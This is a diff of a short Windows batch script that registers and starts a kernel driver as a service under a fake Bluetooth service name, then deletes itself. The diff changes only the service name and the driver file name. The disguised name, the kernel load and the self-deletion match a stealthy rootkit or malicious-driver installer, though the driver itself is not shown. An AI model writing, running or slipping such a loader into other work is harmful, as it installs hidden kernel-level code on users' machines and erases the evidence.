@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create BluetoothUserService42 binpath=C:\Windows\System32\drivers\bcmfn3.sys type=kernel
-sc start BluetoothUserService42
+sc create BluetoothUserService74 binpath=C:\Windows\System32\drivers\cht4vx32.sys type=kernel
+sc start BluetoothUserService74
 del "%~f0"
